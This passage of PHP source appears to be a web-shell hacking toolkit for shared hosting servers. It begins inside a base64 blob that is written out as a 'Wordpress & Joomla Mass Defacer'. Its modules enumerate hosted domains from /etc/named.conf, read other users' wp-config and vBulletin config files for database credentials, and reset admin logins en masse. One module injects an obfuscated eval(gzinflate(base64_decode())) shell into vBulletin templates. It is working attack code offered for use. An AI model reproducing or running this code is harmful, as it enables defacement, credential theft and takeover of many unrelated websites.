Jlc1snb3V0cHV0J10uJzwvdGQ+JzsNCmlmKCRyZXNbJ2NvbmQnXSkgew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJncmVlbiI+REVGQUNFRDwvc3Bhbj48L3RkPic7DQpmd3JpdGUoJGtoYWxlZCwgJ2h0dHA6Ly8nLiRzaXRlX3VybHRvLicvam9vbWxhLycuJHJlc1sndGVtcGxhdGUnXS4nL2luZGV4LnBocDxicj4nKTsNCiRjb3VudDEgPSAkY291bnQxKzE7DQp9IGVsc2Ugew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJyZWQiPkZBSUxFRDwvc3Bhbj48L3RkPic7DQp9DQplY2hvICc8L3RyPic7DQp9DQovLyB0aGlyZCBqb29tbGEgZ3Vlc3MNCmlmKCRqb29tbGEzICYmIHByZWdfbWF0Y2goJy9kYnByZWZpeC9pJywkam9vbWxhMykpew0KZWNobyAnPHRyPjx0ZD48YSBocmVmPSJodHRwOi8vJy4kc2l0ZV91cmx0by4nIiB0YXJnZXQ9ImJsYW5rIj4nLiRzaXRlX3VybHRvLic8L2E+PC90ZD4nOw0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxmb250IGNvbG9yPSJwaW5rIj5KT09NTEE8L2ZvbnQ+PC90ZD4nOw0KJHJlcyA9IGluZGV4X2NoYW5nZXJfam9vbWxhKCRqb29tbGEzLCAkaW5kZXgsICRzaXRlX3VybHRvKTsNCmVjaG8gJzx0ZD4nLiRyZXNbJ291dHB1dCddLic8L3RkPic7DQppZigkcmVzWydjb25kJ10pIHsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0iZ3JlZW4iPkRFRkFDRUQ8L3NwYW4+PC90ZD4nOw0KZndyaXRlKCRraGFsZWQsICdodHRwOi8vJy4kc2l0ZV91cmx0by4nL3NpdGUvJy4kcmVzWyd0ZW1wbGF0ZSddLicvaW5kZXgucGhwPGJyPicpOw0KJGNvdW50MSA9ICRjb3VudDErMTsNCn0gZWxzZSB7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PHNwYW4gY2xhc3M9InJlZCI+RkFJTEVEPC9zcGFuPjwvdGQ+JzsNCn0NCmVjaG8gJzwvdHI+JzsNCn0NCg0KLy8gZmlyc3Qgd29yZHByZXNzIGd1ZXNzDQppZigkd29yZHByZXNzICYmIHByZWdfbWF0Y2goJy9EQl9OQU1FL2knLCR3b3JkcHJlc3MpKXsNCmVjaG8gJzx0cj48dGQ+PGEgaHJlZj0iaHR0cDovLycuJHNpdGVfdXJsdG8uJyIgdGFyZ2V0PSJibGFuayI+Jy4kc2l0ZV91cmx0by4nPC9hPjwvdGQ+JzsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48Zm9udCBjb2xvcj0ieWVsbG93Ij5XT1JEUFJFU1M8L2ZvbnQ+PC90ZD4nOw0KJHJlcyA9IGluZGV4X2NoYW5nZXJfd3AoJHdvcmRwcmVzcywgJGluZGV4KTsNCmVjaG8gJzx0ZD4nLiRyZXNbJ291dHB1dCddLic8L3RkPic7DQppZigkcmVzWydjb25kJ10pIHsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0iZ3JlZW4iPkRFRkFDRUQ8L3NwYW4+PC90ZD4nOw0KZndyaXRlKCRraGFsZWQsICdodHRwOi8vJy4kc2l0ZV91cmx0by4nL3dwLWNvbnRlbnQvdGhlbWVzLycuJHJlc1sndGVtcGxhdGUnXS4nL2luZGV4LnBocDxicj4nKTsNCiRjb3VudDIrKzsNCn0gZWxzZSB7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PHNwYW4gY2xhc3M9InJlZCI+RkFJTEVEPC9zcGFuPjwvdGQ+JzsNCn0NCmVjaG8gJzwvdHI+JzsNCiAgICAgICAgfQ0KCQkNCi8vIHNlY29uZCB3b3JkcHJlc3MgZ3Vlc3MNCmlmKCR3b3JkcHJlc3MyICYmIHByZWdfbWF0Y2goJy9EQl9OQU1FL2knLCR3b3JkcHJlc3MyKSl7DQplY2hvICc8dHI+PHRkPjxhIGhyZWY9Imh0dHA6Ly8nLiRzaXRlX3VybHRvLiciIHRhcmdldD0iYmxhbmsiPicuJHNpdGVfdXJsdG8uJzwvYT48L3RkPic7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PGZvbnQgY29sb3I9InllbGxvdyI+V09SRFBSRVNTPC9mb250PjwvdGQ+JzsNCiRyZXMgPSBpbmRleF9jaGFuZ2VyX3dwKCR3b3JkcHJlc3MyLCAkaW5kZXgpOw0KZWNobyAnPHRkPicuJHJlc1snb3V0cHV0J10uJzwvdGQ+JzsNCmlmKCRyZXNbJ2NvbmQnXSkgew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJncmVlbiI+REVGQUNFRDwvc3Bhbj48L3RkPic7DQpmd3JpdGUoJGtoYWxlZCwgJ2h0dHA6Ly8nLiRzaXRlX3VybHRvLicvYmxvZy93cC1jb250ZW50L3RoZW1lcy8nLiRyZXNbJ3RlbXBsYXRlJ10uJy9pbmRleC5waHA8YnI+Jyk7DQokY291bnQyKys7DQp9IGVsc2Ugew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJyZWQiPkZBSUxFRDwvc3Bhbj48L3RkPic7DQp9DQplY2hvICc8L3RyPic7DQogICAgICAgIH0NCgkJDQovLyB0aGlyZCB3b3JkcHJlc3MgZ3Vlc3MNCmlmKCR3b3JkcHJlc3MzICYmIHByZWdfbWF0Y2goJy9EQl9OQU1FL2knLCR3b3JkcHJlc3MzKSl7DQplY2hvICc8dHI+PHRkPjxhIGhyZWY9Imh0dHA6Ly8nLiRzaXRlX3VybHRvLiciIHRhcmdldD0iYmxhbmsiPicuJHNpdGVfdXJsdG8uJzwvYT48L3RkPic7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PGZvbnQgY29sb3I9InllbGxvdyI+V09SRFBSRVNTPC9mb250PjwvdGQ+JzsNCiRyZXMgPSBpbmRleF9jaGFuZ2VyX3dwKCR3b3JkcHJlc3MzLCAkaW5kZXgpOw0KZWNobyAnPHRkPicuJHJlc1snb3V0cHV0J10uJzwvdGQ+JzsNCmlmKCRyZXNbJ2NvbmQnXSkgew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJncmVlbiI+REVGQUNFRDwvc3Bhbj48L3RkPic7DQpmd3JpdGUoJGtoYWxlZCwgJ2h0dHA6Ly8nLiRzaXRlX3VybHRvLicvd3Avd3AtY29udGVudC90aGVtZXMvJy4kcmVzWyd0ZW1wbGF0ZSddLicvaW5kZXgucGhwPGJyPicpOw0KJGNvdW50MisrOw0KfSBlbHNlIHsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0icmVkIj5GQUlMRUQ8L3NwYW4+PC90ZD4nOw0KfQ0KZWNobyAnPC90cj4nOw0KICAgICAgICB9DQoJDQp9DQplY2hvICc8L3RhYmxlPic7DQplY2hvICc8aHIvPic7DQplY2hvICdUb3RhbCBEZWZhY2VkID0gJy4oJGNvdW50MSskY291bnQyKS4nIChKT09NTEEgPSAnLiRjb3VudDEuJywgV09SRFBSRVNTID0gJy4kY291bnQyLicpPGJyIC8+JzsNCmVjaG8gJzxhIGhyZWY9ImRlZmFjZWQuaHRtbCIgdGFyZ2V0PSJfYmxhbmsiPlNob3cgQWxsPC9hPjxiciAvPic7DQp9DQoNCmVsc2VpZigkX1BPU1RbJ21vZGUnXT09MSkgew0KICAgIEBta2Rpcignc3ltJywwNzc3KTsNCiAgICAkd3IgID0gIk9wdGlvbnMgYWxsIFxuIERpcmVjdG9yeUluZGV4IFN1eC5odG1sIFxuIEFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIFxuIEFkZEhhbmRsZXIgc2VydmVyLXBhcnNlZCAucGhwIFxuICBBZGRUeXBlIHRleHQvcGxhaW4gLmh0bWwgXG4gQWRkSGFuZGxlciB0eHQgLmh0bWwgXG4gUmVxdWlyZSBOb25lIFxuIFNhdGlzZnkgQW55IjsNCiAgICAkZnAgPSBAZm9wZW4gKCdzeW0vLmh0YWNjZXNzJywndycpOw0KICAgIGZ3cml0ZSgkZnAsICR3cik7DQogICAgQHN5bWxpbmsoJy8nLCdzeW0vcm9vdCcpOw0KICAgICRkb21pbmlvcyA9IEBmaWxlX2dldF9jb250ZW50cygiL2V0Yy9uYW1lZC5jb25mIik7DQogICAgQHByZWdfbWF0Y2hfYWxsKCcvLio/em9uZSAiKC4qPykiIHsvJywgJGRvbWluaW9zLCAkb3V0KTsNCiAgICAkb3V0WzFdID0gYXJyYXlfdW5pcXVlKCRvdXRbMV0pOw0KICAgICRudW1lcm9fZG9taW5pb3MgPSBjb3VudCgkb3V0WzFdKTsNCiAgICBlY2hvICJUb3RhbCBkb21haW5zOiAkbnVtZXJvX2RvbWluaW9zIDxicj48YnIgLz4iOw0KICAgICRkZWYgPSAkX1BPU1RbJ3R1bmlzaWEnXTsNCiAgICAkYmFzZV91cmwgPSAnaHR0cDovLycuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uZGlybmFtZSgkX1NFUlZFUlsnU0NSSVBUX05BTUUnXSkuJy9zeW0vcm9vdC9ob21lLyc7DQogICAgJG91dHB1dCA9IGZvcGVuKCdkZWZhY2VkLmh0bWwnLCAnYSsnKTsNCgllY2hvICgiPGNlbnRlcj48dGFibGUgY2xhc3M9J3Jlc3VsdCcgd2lkdGg9JzEwMCUnIGJvcmRlcj0xIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGluZz0xPiAgDQoJPHRyPjx0aCB3aWR0aD01MCU+ZG9tYWluPC90ZD48dGggd2lkdGg9MjUlPlR5cGU8L3RkPjx0aCB3aWR0aD0yNSU+U3RhdHVzPC90ZD48L3RyPiIpOyAgIA0KICAgJGogPSAxOw0KICAgICRzdCA9IChpc3NldCgkX0dFVFsnc3QnXSkgJiYgJF9HRVRbJ3N0J10hPScnKSA/ICRfR0VUWydzdCddIDogMDsNCiAgICBmb3IoJGkgPSAkc3Q7ICRpIDw9ICRudW1lcm9fZG9taW5pb3M7ICRpKyspDQogICAgew0KICAgICAgICAkZG9tYWluID0gJG91dFsxXVskaV07DQogICAgICAgICRkb25vX2FycXVpdm8gPSBAZmlsZW93bmVyKCIvZXRjL3ZhbGlhc2VzLyIuJGRvbWFpbik7DQogICAgICAgICRpbmZvcyA9IEBwb3NpeF9nZXRwd3VpZCgkZG9ub19hcnF1aXZvKTsNCiAgICAgICAgDQogICAgICAgIGlmKCRpbmZvc1snbmFtZSddIT0ncm9vdCcpIHsNCiRjb25maWcwMSA9IEBmaWxlX2dldF9jb250ZW50cygkYmFzZV91cmwuJGluZm9zWyduYW1lJ10uIi9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCIpOw0KJGNvbmZpZzAwMSA9IEBmaWxlX2dldF9jb250ZW50cygkYmFzZV91cmwuJGluZm9zWyduYW1lJ10uIi9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAiKTsNCiRjb25maWcwMiA9IEBmaWxlX2dldF9jb250ZW50cygkYmFzZV91cmwuJGluZm9zWyduYW1lJ10uIi9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwIik7DQokY29uZmlnMDMgPSBAZmlsZV9nZXRfY29udGVudHMoJGJhc2VfdXJsLiRpbmZvc1snbmFtZSddLiIvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwIik7DQoNCmlmKCRjb25maWcwMDEgJiYgcHJlZ19tYXRjaCgnL2RicHJlZml4L2knLCRjb25maWcwMDEpKXsNCmVjaG8gJzx0cj48dGQ+PGEgaHJlZj0iaHR0cDovLycuJGRvbWFpbi4nIiB0YXJnZXQ9ImJsYW5rIj4nLiRkb21haW4uJzwvYT48L3RkPic7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PGZvbnQgY29sb3I9InBpbmsiPkpPT01MQTwvZm9udD48L3RkPic7DQokcmVzID0gaW5kZXhfY2hhbmdlcl9qb29tbGEoJGNvbmZpZzAwMSwgJGRlZiwgJGRvbWFpbik7DQplY2hvICc8dGQ+Jy4kcmVzWydvdXRwdXQnXS4nPC90ZD4nOw0KaWYoJHJlc1snY29uZCddKSB7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PHNwYW4gY2xhc3M9ImdyZWVuIj5ERUZBQ0VEPC9zcGFuPjwvdGQ+JzsNCmZ3cml0ZSgkb3V0cHV0LCAnaHR0cDovLycuJGRvbWFpbi4iPGJyPiIpOw0KJGNvdW50MSA9ICRjb3VudCsxOw0KfSBlbHNlIHsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0icmVkIj5GQUlMRUQ8L3NwYW4+PC90ZD4nOw0KfQ0KZWNobyAnPC90cj4nOw0KfQ0KICAgICAgICANCmlmKCRjb25maWcwMSAmJiBwcmVnX21hdGNoKCcvZGJwcmVmaXgvaScsJGNvbmZpZzAxKSl7DQplY2hvICc8dHI+PHRkPjxhIGhyZWY9Imh0dHA6Ly8nLiRkb21haW4uJyIgdGFyZ2V0PSJibGFuayI+Jy4kZG9tYWluLic8L2E+PC90ZD4nOw0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxmb250IGNvbG9yPSJwaW5rIj5KT09NTEE8L2ZvbnQ+PC90ZD4nOw0KJHJlcyA9IGluZGV4X2NoYW5nZXJfam9vbWxhKCRjb25maWcwMSwgJGRlZiwgJGRvbWFpbik7DQplY2hvICc8dGQ+Jy4kcmVzWydvdXRwdXQnXS4nPC90ZD4nOw0KaWYoJHJlc1snY29uZCddKSB7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PHNwYW4gY2xhc3M9ImdyZWVuIj5ERUZBQ0VEPC9zcGFuPjwvdGQ+JzsNCmZ3cml0ZSgkb3V0cHV0LCAnaHR0cDovLycuJGRvbWFpbi4iPGJyPiIpOw0KJGNvdW50MSA9ICRjb3VudCsxOw0KfSBlbHNlIHsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0icmVkIj5GQUlMRUQ8L3NwYW4+PC90ZD4nOw0KfQ0KZWNobyAnPC90cj4nOw0KfQ0KDQppZigkY29uZmlnMDIgJiYgcHJlZ19tYXRjaCgnL0RCX05BTUUvaScsJGNvbmZpZzAyKSl7DQplY2hvICc8dHI+PHRkPjxhIGhyZWY9Imh0dHA6Ly8nLiRkb21haW4uJyIgdGFyZ2V0PSJibGFuayI+Jy4kZG9tYWluLic8L2E+PC90ZD4nOw0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxmb250IGNvbG9yPSJ5ZWxsb3ciPldPUkRQUkVTUzwvZm9udD48L3RkPic7DQokcmVzID0gaW5kZXhfY2hhbmdlcl93cCgkY29uZmlnMDIsICRkZWYpOw0KZWNobyAnPHRkPicuJHJlc1snb3V0cHV0J10uJzwvdGQ+JzsNCmlmKCRyZXNbJ2NvbmQnXSkgew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJncmVlbiI+REVGQUNFRDwvc3Bhbj48L3RkPic7DQpmd3JpdGUoJG91dHB1dCwgJ2h0dHA6Ly8nLiRkb21haW4uIjxicj4iKTsNCiRjb3VudDIgPSAkY291bnQyKzE7DQp9IGVsc2Ugew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJyZWQiPkZBSUxFRDwvc3Bhbj48L3RkPic7DQp9DQplY2hvICc8L3RyPic7DQp9DQppZigkY29uZmlnMDMgJiYgcHJlZ19tYXRjaCgnL0RCX05BTUUvaScsJGNvbmZpZzAzKSl7DQplY2hvICc8dHI+PHRkPjxhIGhyZWY9Imh0dHA6Ly8nLiRkb21haW4uJyIgdGFyZ2V0PSJibGFuayI+Jy4kZG9tYWluLic8L2E+PC90ZD4nOw0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxmb250IGNvbG9yPSJ5ZWxsb3ciPldPUkRQUkVTUzwvZm9udD48L3RkPic7DQokcmVzID0gaW5kZXhfY2hhbmdlcl93cCgkY29uZmlnMDMsICRkZWYpOw0KZWNobyAnPHRkPicuJHJlc1snb3V0cHV0J10uJzwvdGQ+JzsNCmlmKCRyZXNbJ2NvbmQnXSkgew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJncmVlbiI+REVGQUNFRDwvc3Bhbj48L3RkPic7DQpmd3JpdGUoJG91dHB1dCwgJ2h0dHA6Ly8nLiRkb21haW4uIjxicj4iKTsNCiRjb3VudDIgPSAkY291bnQyKzE7DQp9IGVsc2UgeyAgICANCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0icmVkIj5GQUlMRUQ8L3NwYW4+PC90ZD4nOw0KfQ0KZWNobyAnPC90cj4nOw0KfQ0KICAgICAgICB9DQogICAgfQ0KICAgIGVjaG8gJzwvdGFibGU+JzsNCiAgICBlY2hvICc8aHIvPic7DQogICAgZWNobyAnVG90YWwgRGVmYWNlZCA9ICcuJGNvdW50MSArICRjb3VudDIuJyAoSk9PTUxBID0gJy4kY291bnQxLicsIFdPUkRQUkVTUyA9ICcuJGNvdW50Mi4nKTxiciAvPic7DQoJZWNobyAnPGEgaHJlZj0iZGVmYWNlZC5odG1sIiB0YXJnZXQ9Il9ibGFuayI+U2hvdyBBbGw8L2E+PGJyIC8+JzsNCn0NCmVsc2Ugew0KZWNobyAnDQo8dGFibGU+DQo8Zm9ybSBtZXRob2Q9InBvc3QiPg0KPHRyPg0KCTx0ZD5pbmRleCB1cmwgOiA8L3RkPg0KCTx0ZD48aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNjAiIG5hbWU9InR1bmlzaWEiIHBsYWNlaG9sZGVyPSJwdXQgeW91ciBpbmRleCB1cmwgaGVyZSAhIj48L3RkPg0KPC90cj4NCjx0cj4NCgk8dGQ+dXNlIDogPC90ZD4NCjwvdHI+DQo8dHI+DQoJPHRkPjxpbnB1dCB0eXBlPSJyYWRpbyIgdmFsdWU9IjEiIG5hbWU9Im1vZGUiPjwvdGQ+PHRkPi9ldGMvbmFtZWQuY29uZjwvdGQ+DQo8L3RyPg0KPHRyPg0KCTx0ZD48aW5wdXQgdHlwZT0icmFkaW8iIGNoZWNrZWQ9ImNoZWNrZWQiIHZhbHVlPSIyIiBuYW1lPSJtb2RlIj48L3RkPjx0ZD4vdmFyL25hbWVkPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGJyPjxjZW50ZXI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0idHVuaXNpYV9kZWZhY2UiIHZhbHVlPSJEZWZhY2UiPjwvdGQ+DQo8L3RyPg0KPC9mb3JtPg0KPC9jZW50ZXI+DQo8L2JvZHk+DQo8L2h0bWw+DQonOw0KfQ0KPz4=';
$file = fopen("massjmlawrdprsss.php" ,"w+");
$write = fwrite ($file ,base64_decode($gfgf4fff));
fclose($file);

echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great;'>Wordpress & Joomla Mass Defacer</font></b><center><br><iframe src=massjmlawrdprsss.php width=75% height=60% frameborder=0></iframe></div></center>"; 
}


// Wordpress

if(isset($_GET['action']) && $_GET['action'] == 'wp'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
echo '<br><br><center><span style="font-size:30px; font-family:Fredericka the Great">Mass Change Admin Mass WordPress</span><center><br>';
if(isset($_POST['s'])){

$file = @file_get_contents('wp.txt');

$ex   = explode("\n",$file);

echo "<div class='tmp'><table align='center' width='40%'><td> <font><b>Domains </b></font></td><td> <font><b>Configs </b></font></td><td> <font><b>Result </b></font></td></div>";
flush();
flush();


foreach ($ex as $exp){

$es   = explode("||",$exp);

$config = $es[0];

$domin = $es[1];

$domins = trim($domin).'';

$readconfig  = @file_get_contents(trim($config));

if(ereg('wp-settings.php',$readconfig)){



$pass    =  ex($readconfig,"define('DB_PASSWORD', '","');");

$userdb  =  ex($readconfig,"define('DB_USER', '","');");

$db      =  ex($readconfig,"define('DB_NAME', '","');");

$fix     =  ex($readconfig,'$table_prefix  = \'',"';");

$tab     = $fix.'users';

$con     = @mysql_connect('localhost',$userdb,$pass);

$db      = @mysql_select_db($db,$con);

$query   = @mysql_query("UPDATE `$tab` SET `user_login` ='pwx'") or die;

$query   = @mysql_query("UPDATE `$tab` SET `user_pass` ='$1$4z/.5i..$9aHYB.fUHEmNZ.eIKYTwx/'") or die;



if ($query){$r = '<b style="color: #ee5500">Succeed </b>user [pwx] pass [1]</b>';}

else

{

$r = '<b style="color:red">failed</b>';

}

$domins = trim($domin).'';

echo "<tr>
<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
<td><div class='cone'><a target='_blank' href='$config'>config</a></div></td><td>".$r."</td></tr>";

flush();
flush();

}else{

echo "<tr>
<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
<td><div class='cone'><a target='_blank' href='http://$config'>config</a></div></td><td><b style='color:red'>failed2</b></td></tr>";

flush();
flush();

}
}

die();

}

if(!is_file('named.txt')){

$d00m = @file("/etc/named.conf");

}else{

$d00m = @file("named.txt");

}
if(!$d00m)
{
die ("<meta http-equiv='refresh' content='0; url=?action=read'/>");
}
else
{
echo "<br><div class='tmp'>
<form method='POST' action='$pg?action=wp'>
<input type='submit' value='Mass Change Admin' />
<input type='hidden' value='1' name='s' />
</form>
<br>
<table align='center' width='40%'><td> <font><b>Domains </b></font></td><td> <font><b>Config </b></font></td><td> <font><b>Result </b></font></td>";

flush();
flush();

$f = fopen('wp.txt','w');

foreach($d00m as $dom){

if(eregi("zone",$dom)){

preg_match_all('#zone "(.*)"#', $dom, $domvw);

if(strlen(trim($domvw[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domvw[1][0]));

$wpl=$pageURL."/sim/rut/home/".$user['name']."/public_html/wp-config.php";
$wpp=get_headers($wpl);
$wp=$wpp[0];

$wp2=$pageURL."/sim/rut/home/".$user['name']."/public_html/blog/wp-config.php";
$wpp2=get_headers($wp2);
$wp12=$wpp2[0];

$wp3=$pageURL."/sim/rut/home/".$user['name']."/public_html/wp/wp-config";
$wpp3=get_headers($wp3);
$wp13=$wpp3[0];

$pos = strpos($wp, "200");
$config="&nbsp;";

if (strpos($wp, "200") == true )
{
 $config= $wpl;
}
elseif (strpos($wp12, "200") == true)
{
  $config= $wp2;
}
elseif (strpos($wp13, "200") == true)
{
  $config= $wp3;
}
else
{
continue;

}
flush();

$dom = $domvw[1][0];

$w = fwrite($f,"$config||$dom \n");
if($w){$r = '<b style="color: #ee5500">Save</b>';}else{$r = '<b style="color:red">failed</b>';}

echo "<tr><td><div class='cone'><a href=http://www.".$domvw[1][0].">".$domvw[1][0]."</a></div></td>
<td><div class='cone'><a href='$config'>Config</a></div></td><td>".$r."</td></tr>";
flush();
flush();

flush();

}
}
}
}
echo "</table></div><br><br>";
}


// VBulletin

if(isset($_GET['action']) && $_GET['action'] == 'vb'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
echo '<br><br><center><span style="font-size:30px; font-family:Fredericka the Great">Mass Change Admin vBulletin</span><center><br>';
if(isset($_POST['s'])){

$file = @file_get_contents('vb.txt');

$ex   = explode("\n",$file);

echo "<div class='tmp'><table align='center' width='40%'><td> <font><b>Domains </b><font></td><td> <font><b>Configs </b><font></td><td> <font><b>Result </b><font></td></div>";

foreach ($ex as $exp){

$es   = explode("||",$exp);

$config = $es[0];

$domin = $es[1];

$domins = trim($domin).'';

$readconfig  = @file_get_contents(trim($config));

if(ereg('vBulletin',$readconfig)){

$db      =  ex($readconfig,'$config[\'Database\'][\'dbname\'] = \'',"';");

$userdb  =  ex($readconfig,'$config[\'MasterServer\'][\'username\'] = \'',"';");

$pass    =  ex($readconfig,'$config[\'MasterServer\'][\'password\'] = \'',"';");

$con     = @mysql_connect('localhost',$userdb,$pass);

$db      = @mysql_select_db($db,$con);

$shell   = "bVDPS8MwFL4L/g+vYZAWdPPiaUv14kAQFKqnUUqapjSYNKFJxCn7322abgzcIfDyvl+P7/qKs04D3tS5sJ96MMJ9b+ohDw8vTWcq31PF02yJp/WqzvEaZk2rBwWUOaF7ghAo7jrdEGS0dQh4z9zecIKUl04YOrhV4N821FEEwZQgb6SmDR8QiObsdxYheuMdRKNWSH5UxtmKn3G+v0P5TIxgNTqhWWR9rYSLAXH/RaUfgY8pbVROZ4VI0aawqN5ei/cdDlRcAiFwJEIGv4HyyLTZp4tq+/zyVOxwOASXO+yUqUI6Lm/gHxiBLDic6o62UHjGuLWQJEko99T9Gg7ApeUXJFsq5EX+AR7yPw==" ;

$crypt  = "{\${eval(gzinflate(base64_decode(\'";

$crypt .= "$shell";

$crypt .= "\')))}}{\${exit()}}</textarea>";

$sqlfaq = "UPDATE template SET template ='".$crypt."' WHERE title ='FAQ'" ;

$query  = @mysql_query($sqlfaq,$con);


if ($query){$r = '<b style="color: #ee5500">Succeed</b> shell in search.php';}
else
{
$r = '<b style="color:red">failed</b>';
}
$domins = trim($domin).'';
echo "<tr>
<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
<td><div class='cone'><a target='_blank' href='$config'>Config</a></div></td><td>".$r."</td></tr>";

}else{

echo "<tr>
<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
<td><div class='cone'><a target='_blank' href='http://$config'>Config</a></div></td><td><b style='color:red'>failed2</b></td></tr>";
}
}

die();

}

if(!is_file('named.txt')){

$d00m = file("/etc/named.conf");

}else{

$d00m = file("named.txt");

}
if(!$d00m)
{
die ("<meta http-equiv='refresh' content='0; url=?action=read'/>");
}
else
{
echo "<br><div class='tmp'>
<form method='POST' action='$pg?action=vb'>
<input type='submit' value='Inject shell' />
<input type='hidden' value='1' name='s' />
</form>
<br>
<table align='center' width='40%'><td> <font><b>Domains </b></font></td><td> <font><b>Config </b></font></td><td> <font><b>Result </b></font></td>";

$f = fopen('vb.txt','w');

foreach($d00m as $dom){

if(eregi("zone",$dom)){

preg_match_all('#zone "(.*)"#', $dom, $domvw);

if(strlen(trim($domvw[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domvw[1][0]));

///////////////////////////////////////////////////////////////////////////////////

$wpl=$pageURL."/sim/rut/home/".$user['name']."/includes/config.php";
$wpp=get_headers($wpl);
$wp=$wpp[0];

$wp2=$pageURL."/sim/rut/home/".$user['name']."/vb/includes/config.php";
$wpp2=get_headers($wp2);
$wp12=$wpp2[0];

$wp3=$pageURL."/sim/rut/home/".$user['name']."/forum/includes/config.php";
$wpp3=get_headers($wp3);
$wp13=$wpp3[0];


 ////////// vb ////////////

$pos = strpos($wp, "200");
$config="&nbsp;";

if (strpos($wp, "200") == true )
{
 $config= $wpl;
}
elseif (strpos($wp12, "200") == true)
{
  $config= $wp2;
}
elseif (strpos($wp13, "200") == true)
{
  $config= $wp3;
}
else
{
continue;

}
flush();
$dom = $domvw[1][0];
$w = fwrite($f,"$config||$dom \n");
if($w){$r = '<b style="color: #009900">Save</b>';}else{$r = '<b style="color:red">failed</b>';}
echo "<tr><td><div class='cone'><a href=http://www.".$domvw[1][0].">".$domvw[1][0]."</a></div></td>
<td><div class='cone'><a href='$config'>Config</a></div></td><td>".$r."</td></tr>";
flush();
}
}
}
}
echo "</table></div><br><br>";
}


// Joomla

if(isset($_GET['action']) && $_GET['action'] == 'joomla'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
echo '<br><br><center><span style="font-size:30px; font-family:Fredericka the Great">Mass Change Admin Joomla</span><center><br>';
if(isset($_POST['s'])){

$file = @file_get_contents('joomla.txt');

$ex   = explode("\n",$file);


echo "<div class='tmp'><table align='center' width='40%'><td> <font><b>Domains </b></font></td><td> <font><b>Configs </b></font></td><td> <font><b>Result </b></font></td></div>";
flush();


foreach ($ex as $exp){

$es   = explode("||",$exp);

$config = $es[0];

$domin = $es[1];

$domins = trim($domin).'';

$readconfig  = @file_get_contents(trim($config));

if(ereg('JConfig',$readconfig)){


